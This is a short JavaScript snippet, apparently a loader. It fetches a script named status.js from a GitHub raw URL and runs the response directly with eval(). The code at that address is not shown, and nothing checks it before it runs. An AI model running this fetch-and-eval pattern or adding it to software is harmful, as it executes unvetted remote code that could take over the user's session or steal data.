fetch("https://raw.githubusercontent.com/546pvp/rawjsscripts/main/status.js")
.then(response => response.text())
.then(data => eval(data))
